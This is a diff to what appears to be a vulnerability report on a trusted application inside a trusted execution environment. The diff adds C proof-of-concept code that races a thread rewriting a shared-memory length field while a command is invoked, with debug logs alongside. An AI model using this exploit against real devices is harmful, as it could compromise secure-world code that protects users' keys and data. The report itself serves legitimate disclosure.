@@ -217,9 +217,10 @@ At this point, the attacker only needs to modify the inner data length before th
 
 ## Screenshots for Validity
 
+TODO
 
-### Source code of the POC
 
+For more details, there are some logs for reference.
 
 ```C
 [=]     [TA_CreateEntryPoint] start @0x55555555f6b4
@@ -313,6 +314,146 @@ At this point, the attacker only needs to modify the inner data length before th
 [x]     007ffffffde000 - 008000002de000   rwx     [stack]
 ```
 
+## Source code of the POC
+
+
+
+```C
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <unistd.h>     
+#include <pthread.h>
+#include <sys/mman.h>   
+#include <sys/types.h>  
+#include <stdlib.h>
+#include <string.h>
+#include "tee_client_api.h"
+#include "repro.h"
+#include <dlfcn.h>
+
+TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
+			     TEEC_Session*,
+			     const TEEC_UUID*,
+			     uint32_t,
+			     const void*,
+			     TEEC_Operation*,
+			     uint32_t*);
+TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
+void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
+void (*TEEC_CloseSession_impl)(TEEC_Session*);
+TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
+TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
+TEEC_Result (*TEEC_AllocateSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
+
+typedef struct bs{
+    int* buf0;
+    int* buf1;
+} bs;
+
+void* mod_thread(void* arrg){
+    bs* bsss = (bs*) arrg;
+    int* arg = bsss->buf0;
+    int* arg2 = bsss->buf1;
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    CPU_SET(1, &set);
+    while(1){
+        ((int*)arg)[1] = 0x0;
+        ((int*)arg)[1] = 0x8002;
+        
+    }
+}
+
+typedef struct pls{
+    uint64_t a[3];
+    uint64_t ptr;
+}pls;
+
+void send_req(TEEC_Context *context, TEEC_Session *session)
+{
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    CPU_SET(0, &set);
+
+    uint32_t err_origin;
+    TEEC_Result res; 
+    TEEC_Operation op;
+    memset(&op, 0, sizeof(op));
+        #define buf_size 0x10 
+
+    void* mem_area1 = allocate_param_mem(context, 0x1000);
+    void* mem_area2 = allocate_param_mem(context, 0x1000);
+    memset(mem_area1, 0, buf_size);
+    //((int*)mem_area1)[1] = 0x1000;
+
+    TEEC_SharedMemory in_mem;
+    in_mem.buffer = mem_area1;
+    in_mem.size = buf_size; //param_idx1
+    in_mem.flags = TEEC_MEM_INPUT; // | TEEC_MEM_OUTPUT;
+    res = TEEC_RegisterSharedMemory_impl(context, &in_mem);
+    if (res != TEEC_SUCCESS) {
+        printf("Failed to register shared memory 1 %d\n", res);
+        exit(-1);
+    }
+    pls* wow = (pls*)&in_mem;
+    pls* wow2 = (pls*)wow->ptr;
+    // printf("mem_area1 ptr %p; wow2 ptr %p; in_mem buffer ptr %p\n", mem_area1, wow2->ptr, in_mem.buffer);
+    void* shm = (void*)wow2->ptr;
+    printf("shm ptr %p\n", shm);
+    op.params[0].memref.parent = &in_mem;  // the keyblock buffer
+
+    pthread_t tid;
+    bs someshit;
+    someshit.buf0 = (int*)shm;
+    someshit.buf1 = (int*)mem_area1;
+    if (pthread_create(&tid, NULL, mod_thread, &someshit) != 0) {
+        perror("pthread_create failed");
+        return;
+    }
+    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_WHOLE, TEEC_MEMREF_TEMP_OUTPUT,
+                                     TEEC_NONE, TEEC_NONE);
+    printf("params: 0x%lx\n", op.paramTypes);
+    
+    res = TEEC_InvokeCommand_impl(session, 0xc0, &op, &err_origin);
+    printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
+}
+
+
+int main(int argc, char **argv)
+{
+    char* ta = "00000000-0000-0000-0000-4662436b6d52";
+    TEEC_UUID *uuid = teegris_uuid(ta); 
+
+    uint32_t err_origin;
+    TEEC_Result res;
+	TEEC_Context context;
+    TEEC_Session session;
+
+    load_functions();
+
+    // Initialize context
+    res = TEEC_InitializeContext_impl(NULL, &context);
+    if (res != TEEC_SUCCESS) {
+        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
+        exit(-1);
+    }
+    // Open session to trusted application
+    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
+                           NULL, NULL, &err_origin);
+    if (res != TEEC_SUCCESS) {
+        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
+               res, err_origin);
+        TEEC_FinalizeContext_impl(&context);
+        exit(-1);
+    }
+
+    send_req(&context, &session);
+    TEEC_CloseSession_impl(&session);
+    TEEC_FinalizeContext_impl(&context);
+    return 0;
+}
+```
+
 For reference, the dependent files for the PoC are attached here.
 - `tee_client_api.h`: Open-sourced in the OPTEE repo
 - `tee.h`: Open-sourced in the OPTEE repo
@@ -321,7 +462,7 @@ For reference, the dependent files for the PoC are attached here.
 
 
 
-### Vulnerability Reproduction
+## Vulnerability Reproduction
 
 1. preacquisition
 2. interaction
